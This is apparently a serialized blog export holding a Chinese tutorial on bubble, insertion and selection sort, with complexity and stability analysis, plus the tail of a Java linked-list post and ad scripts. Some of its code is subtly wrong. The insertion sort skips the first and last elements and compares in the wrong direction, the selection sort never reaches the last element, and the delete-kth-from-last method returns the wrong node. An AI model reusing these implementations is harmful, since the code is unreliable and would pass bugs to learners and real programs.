p.next = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (q != <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            r = q.next;</span><br><span class=\"line\">            q.next = p;</span><br><span class=\"line\">            p = q;</span><br><span class=\"line\">            q = r;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**删除链表倒数第K个结点*/</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Node&lt;Integer&gt; <span class=\"title\">deleteLastKDesc</span><span class=\"params\">(Node&lt;Integer&gt; head, <span class=\"keyword\">int</span> k)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (head == <span class=\"keyword\">null</span> || k &lt;<span class=\"number\">0</span>) <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        Node&lt;Integer&gt; p = head;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p != <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">            k--;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (k == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> head.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (k &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            p = head;</span><br><span class=\"line\">            <span class=\"keyword\">while</span> (++k != <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">                p = p.next;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            p.next = p.next.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Node</span>&lt;<span class=\"title\">E</span>&gt; </span>&#123;</span><br><span class=\"line\">        E val;</span><br><span class=\"line\">        Node&lt;E&gt; next;</span><br><span class=\"line\">        Node(E e)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.val = e;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> String <span class=\"title\">printLinkList</span><span class=\"params\">(Node&lt;Integer&gt; head)</span></span>&#123;</span><br><span class=\"line\">        StringBuilder sb = <span class=\"keyword\">new</span> StringBuilder();</span><br><span class=\"line\">        sb.append(<span class=\"string\">\"[\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (head !=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (head.next !=<span class=\"keyword\">null</span>)</span><br><span class=\"line\">                sb.append(head.val).append(<span class=\"string\">\", \"</span>);</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">                sb.append(head.val);</span><br><span class=\"line\">            head = head.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        sb.append(<span class=\"string\">\"]\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> sb.toString();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n"},{"title":"算法-排序(上)","date":"2018-09-20T10:35:29.000Z","mathjax":true,"_content":"\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n排序对一个程序员来说，可能都不会陌生。大部分编程语言中，也都提供了排序函数。在平常的项目中，也经常会用到排序。排序非常重要，所以会分几节详细讲一讲经典的排序算法。\n\n排序算法太多了，可能有的连名字都没有听说过，比如猴子排序、睡眠排序、面条排序等等。这里只列举众多排序算法众多的一小撮，也是最经典的、最常用的：冒泡排序、插入排序、选择排序、归并排序、快速排序、计数排序、基数排序、桶排序。按照时间复杂度把他们分成了三类，分上中下三节来讲。\n\n|   |排序算法|时间复杂度|是否基于比较|\n|---|-----------|----------|------|\n|上|冒泡、插入、选择|$ O(n^2) $| √ |\n|中|快排、归并     |$ O(nlogN) $| √ |\n|下|桶、计数、基数  |$ O(n) $| × |\n\n带着问题去学习，是最有效的学习方法。所以按照惯例，先给出思考题：<font color=\"red\">**插入排序和冒泡排序的时间复杂度相同，都是$O(n^2)$，在实际软件开发里，为什么更倾向于使用插入排序而不是冒泡排序呢？**</font>\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何分析一个排序算法\n{% endnote %}\n</div>\n\n学习排序算法，除了学习他的算法原理、代码实现之外，更重要的是学会如何评价、分析一个排序算法。**那么要分析一个排序算法，要从哪几方面入手呢？**\n\n#### 一、 算法的执行效率\n\n对于排序算法的执行效率的分析，我们一般会从以下几点来进行衡量：\n\n**1、最好情况、最坏情况、平均情况时间复杂度**\n\n我们在分析排序算法的时间复杂度时，要分别给出最好情况、最坏情况、平均情况下的时间复杂度。除此之外，你还要说出最好情况、最坏情况时间复杂度对应的要排序的原始数据是什么样。\n\n为什么要区分这三种时间复杂度呢？第一，有些排序算法会区分，为了好对比，我们最好都做一下区分。第二，对于要排序的数据，有的接近有序，有的接近无序。有序度不同的数据集，对于排序的执行时间肯定会有影响的，我们要知道排序算法在不同数据下的性能表现。\n\n**2、时间复杂度的系数、常数、低阶**\n\n我们知道，时间复杂度反应的是数据规模n很大的时候的一个增长趋势，所以它表示的时候会忽略系数、常数、低阶。但是实际的软件开发中，我们排序的可能是10个、100个、1000个这样数据规模较小的数据，所以，在对同一阶时间复杂度的排序算法性能对比的时候，我们就要把系数、常数、低阶也考虑进来。\n\n**3、比较次数和交换次数**\n\n这一节和下一节讲的都是基于比较的排序算法。基于比较的排序算法的执行过程中，会涉及两种操作，一个是元素比较大小，另一个是元素交换或移动。所以，如果我们在分析排序算法的执行效率的时候，应该把比较次数和交换次数考虑进去。\n\n#### 二、 算法的内存消耗\n\n前面讲过算法的内存消耗可以通过空间复杂度来衡量，排序算法也不例外。不过针排序算法的空间复杂度，我们引入一个新概念，**原地排序**。原地排序算法，就是特指空间复杂度为O(1)的排序算法，我们这节讲的三种排序算法都是原地排序算法。\n\n#### 三、 排序算法的稳定性\n\n仅仅用执行效率和内存消耗来衡量排序算法的好坏是不够的。针对排序算法，我们还有一个重要的度量指标，**稳定性**。这个概念是说，如果待排序的序列中存在值相同的元素，经过排序之后，相等元素之间原有的先后顺序不变。\n\n我通过一个例子来解释一下。比如我们有一组数据2,9,3,4,8,3，按照大小排序之后就是2,3,3,4,8,9。\n\n这组数据里有两个3，经过某种排序算法排序之后，如果两个3的前后顺序没有改变，那我们就把这种排序算法叫做**稳定的排序算法**；如果前后顺序发生变化，那对应的排序算法就叫做**不稳定的排序算法**。\n\n你可能要问了，这两个3哪个在前，哪个在后有什么关系啊。稳不稳定又有什么关系呢？为什么要考察排序算法的稳定性呢？\n\n很多数据结构和算法的课程，再讲排序的时候，都是用整数来举列的。但在真正的软件开发中，我们要排序的往往不是单纯的整数，而是一组对象，我们需要按照对象的某个key来排序。\n\n比如说，我们现在要给电商交易系统的“订单”排序，订单有两个属性，一个是下单时间，一个是订单金额。如果我们现在有10万条订单数据，我们希望按照订单金额从小到大对订单数据进行排序，对于金额相同的订单，我们希望按照下单时间从早到晚有序，对于这样一个排序需求，我们怎么来做呢？\n\n最先想到的方法是，我们先按照金额对订单数据进行排序，然后，在遍历排序之后的订单数据，对于每个金额相同的小区间再按照下单的时间排序。这种排序思路理解起来不难，但是实现起来会很复杂。\n\n但是借助稳定排序算法，这个问题可以非常简洁的解决。解决思路是这样的，我们先按照下单时间给订单排序，注意是下单时间，不是订单金额，排序完成之后，我们再用稳定排序算法，按照订单金额重新排序。这样两遍排序之后，我们得到的就是订单数据按照金额大小从小到大排序，金额相同的订单按照下单时间从早到晚排序的。为什么呢？\n\n**稳定排序算法可以保持金额相同的两个对象，再排序前后的顺序保持不变**。第一次排序之后，所有的订单按照下单时间从早到晚有序了。在第二次排序中，我们用的是稳定的排序算法，所以经过第二次排序之后，相同金额的订单仍然保持下单时间从早到晚有序。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 冒泡排序\n{% endnote %}\n</div>\n\n我们从冒泡排序开始，学习今天的三种排序算法。\n\n冒泡排序只会操作相邻的两个数据。每次冒泡排序都会对相邻的两个数据进行比较，看是否满足大小关系要求，如果不满足就让它两互换。一次冒泡会让至少一个元素移动到它应该在的位置，重复n次，就完成了对n个数据的排序工作。\n\n我用一个例子，带你看下冒泡排序的整个过程。我们要对一组数据4,5,6,3,2,1，从小到大进行排序。第一次冒泡排序的详细过程就是这样：\n\n{% asset_img 冒泡排序第一次过程.png %}\n\n可以看出，经过第一次冒泡排序之后，6这个元素已经存储在正确的位置上了。要想完成所有数据的排序，我们只需要进行6次这样的冒泡排序操作就对了。\n\n{% asset_img 冒泡排序过程.jpg %}\n\n实际上，刚才的冒泡排序还可以优化，当某次操作已经没有数据交换时，说明已经完全有序，不需要在执行后续的冒泡操作了。我这里给一个例子，这里面给6个元素排序，只需要4次冒泡操作就可以了。\n\n| 冒泡次数 | 冒泡结果 | 是否有数据交换|\n|---------|---------|--------------|\n| 初始状态 |3，5，4，1，2，6|    -       |\n|第一次冒泡|3，4，1，2，5，6|     有     |\n|第二次冒泡|3，1，2，4，5，6|     有     |\n|第三次冒泡|1，2，3，4，5，6|     有     |\n|第四次冒泡|1，2，3，4，5，6|  无，结束排序操作|     \n\n冒泡排序算法的原理比较好理解，具体的代码如下，你可以结合代码理解原理。\n\n```java\n// 冒泡排序 a表示需要排序的数组 n表示数组的大小\npublic void bubbleSort(int[] a,int n){\n    for(int i=0;i<n-1;i++){\n        boolean flag = false;\n        for(int j=0;j<n-1-i;j++){\n            if(a[j]>a[j+1]){\n                int temp = a[j];\n                a[j] = a[j+1];\n                a[j+1] = temp;\n                flag = true;\n            }\n        }\n        if(!flag) break;\n    }\n}\n```\n\n现在结合上面分析算法的三个方面，有三个问题要问你。\n\n**第一、冒泡排序是原地排序算法吗？**\n\n冒泡的过程只涉及相邻两个数据的交换操作，字需要一个常量级的临时空间，所以它的空间复杂度是O(1)，是一个原地排序算法。\n\n**第二、冒泡排序是稳定的排序算法吗？**\n\n在冒泡排序中，只有交换才可以改变两个元素的前后位置。为了保证冒泡排序算法的稳定性，当有相邻的两个元素相等时，我们不做交换，相同大小的数据在排序前后不改变顺序，所以冒泡排序算法是稳定的排序算法。\n\n**第三、冒泡排序的时间复杂度是多少？**\n\n最好的情况下，要排序的数据已经是有序的了，我们只需要进行一次冒泡排序就可以了，所以最好的时间复杂度为$O(n)$。而在最坏情况下，要排序的数据是倒序排列的，我们需要进行n次冒泡排序，所以最坏情况时间复杂度为$O(n^2)$。\n\n最好、最好情况时间复杂度很容易区分，那平均情况时间复杂度是多少呢？我们前面讲过，平均时间复杂度就是加权平均期望时间复杂度，分析的时候要结合概率论的知识。\n\n对于包含n个元素的数组，这n个数据有 n! 种排列方式。不同的排列方式，冒泡排序执行的时间是不同的。比如我们前面举的那个例子，一个需要6次冒泡，而另一个只需要4次。如果用概率论的方法定量分析平均时间复杂度，那涉及到的数学推理和计算就会很复杂。我这里还有一种思路，通过**有序度**和**逆序度**这两个概念来分析。\n\n有序度是数组中具有有序关系的元素对的个数。有序元素对用数学表达式表示就是这样： $a[i] <= a[j], 如果i < j$。\n\n2,4,3,1,5,6 这组数据的有序度为11。因其有序元素对为11个，分别是: (2,4) (2,3) (2,5) (2,6) (4,5) (4,6) (3,5) (3,6) (1,5) (1,6) (5,6)\n\n同理，对于一个倒序排列的数组，比如 6,5,4,3,2,1，有序度为0；对于一个完全有序的数组，比如1,2,3,4,5,6，有序度就是n\\*(n-1)/2，也就是15.我们把完全有序的数组的有序度叫做**满有序度**。\n\n逆序度的定义正好跟有序度的定义相反(默认从小到大为有序)，我想你已经想到了。关于逆序度，我们就不举例子说明了。你可以结合有序度的例子自己看一下：$a[i] > a[j], 如果i < j$。\n\n关于这三个概念，我们可以得到一个公式：**逆序度 = 满有序度 - 有序度**。我们排序的过程就是一种增加有序度，减少逆序度的过程，最后达到满有序度，就说明排序完成了。\n\n我还是拿前面举得那个冒泡排序的例子说明。要排序的数组的初始状态为4,5,6,3,2,1，其中，有序元素对(4,5)、(4,6)、(5,6)，所以有序度为3。 n=6，所以排序完成之后终态的满有序度为15.\n\n| 冒泡次数 | 冒泡结果 | 有序度|\n|---------|---------|--------------| \n| 初始状态 |4，5，6，3，2，1 |  3  |\n|第一次冒泡|4，5，3，2，1，6 |  6  |\n|第二次冒泡|4，3，2，1，5，6 |  9  |\n|第三次冒泡|3，2，1，4，5，6 | 12  |\n|第四次冒泡|2，1，3，4，5，6 | 14  |\n|第五次冒泡|1，2，3，4，5，6 | 15  |\n\n冒泡排序包含两个原子操作，**比较**和**交换**。每交换一次，有序度就加1,。不管算法怎么改进，交换次数是确定的，即为**逆序度，也就是n\\*(n-1)/2 - 初始有序度**。此例中就是15-3=12，也就是要进行12次交换操作。\n\n对于包含n个数据的数组进行冒泡排序，平均交换次数是多少呢？最坏情况下，初始状态的有序度为0，所有要进行n\\*(n-1)、2次交换。最好情况下，初始状态的有序度为满有序度，就不需要进行交换。我们去平均值n\\*(n-1)/4，来表示初始有序度既不是很高也不是很低的平均情况。\n\n换句话说，平均情况下需要n\\*(n-1)/4次交换操作，比较操作肯定要比交换操作多，而时间复杂度的上限位$O(n^2)$，所以平均情况下的时间复杂度就是$O(n^2)$。\n\n这个平均时间复杂度的推导过程并不严格，但是很多时候很有用，毕竟概率论的定量分析太复杂，不太好用。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 插入排序\n{% endnote %}\n</div>\n\n我们先来看一个问题。如果一个有序的数组，我们往里面添加一个新的数据后，如何继续保持数据有序呢？很简单，我们只要遍历数组，找到数据应该插入的位置将其插入即可。\n\n这是一个动态排序的过程，即动态的往有序集合中添加数据，我们可以通过这种方法保持集合中的数据一直有序。而对于一组静态数据，我们也可以借鉴上面讲的插入方法，来进行排序，于是就有了插入排序算法。\n\n那插入排序是如何借助上面的思想来实现排序的呢？\n\n首先，我们将数组中的数据分为两个区间，**已排序区间**和**未排序区间**。初始已排序区间只有一个元素，就是数组中的第一个元素。插入排序算法的核心思想是取未排序区间的元素，在已排序区间中找到合适的位置插入，并保证已排序区间中的元素一直有序，重复这个过程，知道未排序区间中元素为空，算法结束。\n\n如图所示，要排序的数据是4,5,6,1,3,2，其中左侧为已排序区间，右侧为未排序区间。\n\n{% asset_img 插入排序过程.jpg %}\n\n插入排序也包含两种操作，一种是元素的比较，一种是元素的移动。当我们需要将一个元素a插入到已排序区间时，需要先拿a和已排序区间的元素一次比较大小，找到合适的位置插入。找到插入点之后，我们还需要将插入点之后的额元素顺序往后移动一位，这样才能腾出空间为元素a插入。\n\n对于不同的查找插入点的方法（从头到尾、从尾到头），元素的比较次数是有区别的。但对于一个给定的初始序列，移动操作的次数是固定的，就等于逆序度。\n\n为什么说移动次数就等于逆序度呢？我拿刚才的例子画一个图表，你一看就明白了。满有序度是n\\*(n-1)/2=15, 初始有序度为5，所以逆序度为10,。插入排序中，数据移动的个数总和也等于3+3+4=10。\n\n{% asset_img 插入排序移动次数.jpg %}\n\n插入排序的原理也很简单吧。你也可以结合一下代码理解插入排序：\n\n```java\npublic void insertSort(int[] a, int n){\n\tif(n<=1) return;\n\tfor(int i=1;i<n-1;i++){\n\t\tint val = a[i];\n\t\tint j=i-1;\n\t\tfor(;j>0;j--){\n\t\t\tif(a[j]<val){\n\t\t\t\ta[j+1] = a[j];\n\t\t\t}else {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\ta[j+1] = val;\n\t}\n}\n```\n\n现在同样有三个问题。\n\n**第一、插入排序是原地排序算法吗？**\n\n从实现过程可以明显的看出，插入排序的运行不需要额外的存储空间，所以插入排序的空间复杂度为O(1)，是一个原地排序算法。\n\n**第二、插入排序是稳定的排序算法吗？**\n\n在插入排序中，对于值相同的元素，我们可以选择将后面出现的元素，插入到前面出现的元素的后面，这样就可以保持原有的前后顺序不变，所有插入排序是稳定排序算法。\n\n**第三、插入排序的时间复杂度是多少？**\n\n如果要排序的数据已经是有序的，我们并不需要搬移任何数据。如果我们从尾到头在有序数组里查找插入位置，每次只需比较一个数据就能确定插入的位置。所以这种情况下，最好是时间复杂度为O(n)。注意，这里是**从尾到头遍历已经有序的数据**。\n\n如果数组是倒序的，每次插入都相当于在数组的第一个位置插入新的数据，所以需要搬移大量的数据，所以最坏情况下的时间复杂度为$O(n^2)$。\n\n还记得我们在一个数组中插入一个数据的平均复杂度是多少吗？没错，是O(n)，所以对于插入排序来说，每次插入操作都相当于在数组中插入一个数据，执行n次插入操作，所以平均时间复杂度为$O(n^2)$。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 选择排序\n{% endnote %}\n</div>\n\n选择排序算法的实现思路有点类似插入排序，也分已排序区间和未排序区间。但是选择排序每次会从未排序区间中找到最小元素，将其放到已排序区间的末尾。\n\n{% asset_img 选择排序过程.jpg %}\n\n同样，也有三个问题需要你思考。\n\n**第一、插入排序是原地排序算法吗？**\n\n首先选择排序的空间复杂度为O(1)，所以是一种原地排序算法。\n\n**第二、插入排序的时间复杂度是多少？**\n\n选择排序最好情况时间复杂度、最坏情况时间复杂度、平均情况时间复杂度均为$O(n^2)$。你可以自己分析看看。\n\n**第三、插入排序是稳定的排序算法吗？**\n\n答案是否定的，选择排序是一种不稳定的排序算法。从选择排序的原理示意图可以看出，选择排序每次都要找剩余排序元素中的最小值，并和前面元素交换位置，这就破坏了稳定性。\n\n比如5,8,5,2,9这样一组数据，使用选择排序来排序的话，第一次找到最小元素2，与第一个5交换位置，那第一个5个中间5的顺序就变了，所以就不稳定了。正是因此，相对于冒泡排序和插入排序，选择排序就稍微逊色了。\n\n```java\npublic void selectSort(int[] a, int n){\n    for(int i=0;i<n-1;i++){\n        for(int j=i+1; j<n-1;j++){\n        \tif(a[j]<a[i]){\n        \t\tint temp = a[j];\n        \t\ta[j] = a[i];\n        \t\ta[i] = temp;\n        \t}\n        }\n    }\n}\n```\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n基本的知识都讲完了，我们来看看开篇的问题：冒泡排序和插入排序的时间复杂度都为$O(n^2)$，都是原地排序算法，为什么插入排序要比冒泡排序更受欢迎呢？\n\n我们前面分析冒泡排序和插入排序的时候讲到，冒泡排序不管怎么优化，元素交换的次数是一个固定的值，是原始数据的逆序度。插入排序是同样的，不管怎么优化，移动次数等于原始数据的逆序度。\n\n但是从代码实现上来看，冒泡排序的数据交换要比插入排序的数据移动要复杂，冒泡排序需要3个赋值操作，而插入排序只需要一个。我们来看一下下面这段操作：\n\n```java\n// 冒泡排序中的数据交换操作\n if(a[j]>a[j+1]){\n    int temp = a[j];\n    a[j] = a[j+1];\n    a[j+1] = temp;\n    flag = true;\n}\n\n// 插入排序中数据移动操作\nif(a[j]<val){\n    a[j+1] = a[j];\n}else {\n    break;\n}\n```\n\n我们把执行一个赋值语句的时间粗略的估计为单位时间unit_time，然后分别用冒泡排序和插入排序对同一个逆序度为K的数组进行排序。用冒泡排序需要K次交换操作，每次需要3个赋值语句，所以交换操作总耗时就是3K单位时间。而插入排序中数据移动操作只需要K个单位时间。\n\n所以，虽然冒泡排序和插入排序的时间复杂度是一样的，但是如果我们希望把性能优化做到极致，那肯定首选插入排序。插入排序的算法思路也有很大的优化空间，我们只讲了最基础的一种。如果你对插入排序的优化感兴趣，可以自己学习一下希尔排序。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n想要分析、评价一个排序算法，需要从执行效率、内存消耗和稳定性三个方面来看。因此这一节，分析了三种时间复杂度为$O(n^2)$的排序算法：冒泡排序、插入排序、选择排序。需要重点掌握的是它们的分析方法。\n\n|排序算法 | 是否原地排序| 是否稳定|   最好    |   最坏  |   平均  |\n|--------|------------|--------|-----------|---------|---------|\n|冒泡排序 |    √       |  √     | $O(n)$  | $O(n^2)$ |$O(n^2)$|\n|插入排序 |    √       |  √     | $O(n)$  | $O(n^2)$ |$O(n^2)$|\n|选择排序 |    √       |  ×     | $O(n^2)$  | $O(n^2)$ |$O(n^2)$|\n\n这三种时间复杂度为$O(n^2)$的排序算法中，冒泡排序、选择排序可能就纯粹停留在理论的层面了，实际开发中应用并不多，但是插入排序还是挺有用的。后面讲排序优化的时候，有些语言的排序函数的实现会用到插入排序算法。\n\n今天讲的三种算法，实现代码都非常简单，对于小规模的数据排序，用起来非常高效，但是在大规模数据排序的时候，这个时间复杂度就稍微有点高了。所以我们更倾向于使用下一节讲的时间复杂度为$O(n\\*logn)$的排序算法。\n\n### 课后思考\n\n我们讲过，特定的算法是依赖于特定的数据结构的。我们今天讲的几种排序算法，都是基于数组实现的。如果数组存储在链表中，这三种排序算法还能工作吗？如果能，相应的时间、空间复杂度又是多少？\n\n<br>\n<br>\n<br>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-排序(上).md","raw":"---\ntitle: 算法-排序(上)\ndate: 2018-09-20 18:35:29\ntags: ['算法','排序','冒泡排序','插入排序','选择排序']\ncategories: 算法\nmathjax: true\n---\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n排序对一个程序员来说，可能都不会陌生。大部分编程语言中，也都提供了排序函数。在平常的项目中，也经常会用到排序。排序非常重要，所以会分几节详细讲一讲经典的排序算法。\n\n排序算法太多了，可能有的连名字都没有听说过，比如猴子排序、睡眠排序、面条排序等等。这里只列举众多排序算法众多的一小撮，也是最经典的、最常用的：冒泡排序、插入排序、选择排序、归并排序、快速排序、计数排序、基数排序、桶排序。按照时间复杂度把他们分成了三类，分上中下三节来讲。\n\n|   |排序算法|时间复杂度|是否基于比较|\n|---|-----------|----------|------|\n|上|冒泡、插入、选择|$ O(n^2) $| √ |\n|中|快排、归并     |$ O(nlogN) $| √ |\n|下|桶、计数、基数  |$ O(n) $| × |\n\n带着问题去学习，是最有效的学习方法。所以按照惯例，先给出思考题：<font color=\"red\">**插入排序和冒泡排序的时间复杂度相同，都是$O(n^2)$，在实际软件开发里，为什么更倾向于使用插入排序而不是冒泡排序呢？**</font>\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何分析一个排序算法\n{% endnote %}\n</div>\n\n学习排序算法，除了学习他的算法原理、代码实现之外，更重要的是学会如何评价、分析一个排序算法。**那么要分析一个排序算法，要从哪几方面入手呢？**\n\n#### 一、 算法的执行效率\n\n对于排序算法的执行效率的分析，我们一般会从以下几点来进行衡量：\n\n**1、最好情况、最坏情况、平均情况时间复杂度**\n\n我们在分析排序算法的时间复杂度时，要分别给出最好情况、最坏情况、平均情况下的时间复杂度。除此之外，你还要说出最好情况、最坏情况时间复杂度对应的要排序的原始数据是什么样。\n\n为什么要区分这三种时间复杂度呢？第一，有些排序算法会区分，为了好对比，我们最好都做一下区分。第二，对于要排序的数据，有的接近有序，有的接近无序。有序度不同的数据集，对于排序的执行时间肯定会有影响的，我们要知道排序算法在不同数据下的性能表现。\n\n**2、时间复杂度的系数、常数、低阶**\n\n我们知道，时间复杂度反应的是数据规模n很大的时候的一个增长趋势，所以它表示的时候会忽略系数、常数、低阶。但是实际的软件开发中，我们排序的可能是10个、100个、1000个这样数据规模较小的数据，所以，在对同一阶时间复杂度的排序算法性能对比的时候，我们就要把系数、常数、低阶也考虑进来。\n\n**3、比较次数和交换次数**\n\n这一节和下一节讲的都是基于比较的排序算法。基于比较的排序算法的执行过程中，会涉及两种操作，一个是元素比较大小，另一个是元素交换或移动。所以，如果我们在分析排序算法的执行效率的时候，应该把比较次数和交换次数考虑进去。\n\n#### 二、 算法的内存消耗\n\n前面讲过算法的内存消耗可以通过空间复杂度来衡量，排序算法也不例外。不过针排序算法的空间复杂度，我们引入一个新概念，**原地排序**。原地排序算法，就是特指空间复杂度为O(1)的排序算法，我们这节讲的三种排序算法都是原地排序算法。\n\n#### 三、 排序算法的稳定性\n\n仅仅用执行效率和内存消耗来衡量排序算法的好坏是不够的。针对排序算法，我们还有一个重要的度量指标，**稳定性**。这个概念是说，如果待排序的序列中存在值相同的元素，经过排序之后，相等元素之间原有的先后顺序不变。\n\n我通过一个例子来解释一下。比如我们有一组数据2,9,3,4,8,3，按照大小排序之后就是2,3,3,4,8,9。\n\n这组数据里有两个3，经过某种排序算法排序之后，如果两个3的前后顺序没有改变，那我们就把这种排序算法叫做**稳定的排序算法**；如果前后顺序发生变化，那对应的排序算法就叫做**不稳定的排序算法**。\n\n你可能要问了，这两个3哪个在前，哪个在后有什么关系啊。稳不稳定又有什么关系呢？为什么要考察排序算法的稳定性呢？\n\n很多数据结构和算法的课程，再讲排序的时候，都是用整数来举列的。但在真正的软件开发中，我们要排序的往往不是单纯的整数，而是一组对象，我们需要按照对象的某个key来排序。\n\n比如说，我们现在要给电商交易系统的“订单”排序，订单有两个属性，一个是下单时间，一个是订单金额。如果我们现在有10万条订单数据，我们希望按照订单金额从小到大对订单数据进行排序，对于金额相同的订单，我们希望按照下单时间从早到晚有序，对于这样一个排序需求，我们怎么来做呢？\n\n最先想到的方法是，我们先按照金额对订单数据进行排序，然后，在遍历排序之后的订单数据，对于每个金额相同的小区间再按照下单的时间排序。这种排序思路理解起来不难，但是实现起来会很复杂。\n\n但是借助稳定排序算法，这个问题可以非常简洁的解决。解决思路是这样的，我们先按照下单时间给订单排序，注意是下单时间，不是订单金额，排序完成之后，我们再用稳定排序算法，按照订单金额重新排序。这样两遍排序之后，我们得到的就是订单数据按照金额大小从小到大排序，金额相同的订单按照下单时间从早到晚排序的。为什么呢？\n\n**稳定排序算法可以保持金额相同的两个对象，再排序前后的顺序保持不变**。第一次排序之后，所有的订单按照下单时间从早到晚有序了。在第二次排序中，我们用的是稳定的排序算法，所以经过第二次排序之后，相同金额的订单仍然保持下单时间从早到晚有序。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 冒泡排序\n{% endnote %}\n</div>\n\n我们从冒泡排序开始，学习今天的三种排序算法。\n\n冒泡排序只会操作相邻的两个数据。每次冒泡排序都会对相邻的两个数据进行比较，看是否满足大小关系要求，如果不满足就让它两互换。一次冒泡会让至少一个元素移动到它应该在的位置，重复n次，就完成了对n个数据的排序工作。\n\n我用一个例子，带你看下冒泡排序的整个过程。我们要对一组数据4,5,6,3,2,1，从小到大进行排序。第一次冒泡排序的详细过程就是这样：\n\n{% asset_img 冒泡排序第一次过程.png %}\n\n可以看出，经过第一次冒泡排序之后，6这个元素已经存储在正确的位置上了。要想完成所有数据的排序，我们只需要进行6次这样的冒泡排序操作就对了。\n\n{% asset_img 冒泡排序过程.jpg %}\n\n实际上，刚才的冒泡排序还可以优化，当某次操作已经没有数据交换时，说明已经完全有序，不需要在执行后续的冒泡操作了。我这里给一个例子，这里面给6个元素排序，只需要4次冒泡操作就可以了。\n\n| 冒泡次数 | 冒泡结果 | 是否有数据交换|\n|---------|---------|--------------|\n| 初始状态 |3，5，4，1，2，6|    -       |\n|第一次冒泡|3，4，1，2，5，6|     有     |\n|第二次冒泡|3，1，2，4，5，6|     有     |\n|第三次冒泡|1，2，3，4，5，6|     有     |\n|第四次冒泡|1，2，3，4，5，6|  无，结束排序操作|     \n\n冒泡排序算法的原理比较好理解，具体的代码如下，你可以结合代码理解原理。\n\n```java\n// 冒泡排序 a表示需要排序的数组 n表示数组的大小\npublic void bubbleSort(int[] a,int n){\n    for(int i=0;i<n-1;i++){\n        boolean flag = false;\n        for(int j=0;j<n-1-i;j++){\n            if(a[j]>a[j+1]){\n                int temp = a[j];\n                a[j] = a[j+1];\n                a[j+1] = temp;\n                flag = true;\n            }\n        }\n        if(!flag) break;\n    